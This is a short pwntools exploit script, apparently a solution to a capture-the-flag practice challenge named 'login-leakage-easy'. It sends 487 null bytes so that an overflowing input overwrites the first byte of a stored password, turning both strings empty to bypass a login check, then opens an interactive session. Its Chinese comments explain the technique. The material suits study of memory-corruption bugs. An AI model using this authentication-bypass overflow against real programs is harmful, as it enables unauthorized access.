#!/usr/bin/env python3
from pwn import *

p = process('/challenge/login-leakage-easy')

# 486 bytes 的 \x00 用来填满 buffer，同时让 input 变成空字符串 ""
# 第 487 个 byte 的 \x00 用来精准覆盖 password 的第一个字节，让它也变成 ""
payload = b'\x00' * 487

p.sendline(str(len(payload)).encode())

p.sendline(payload)

p.interactive()

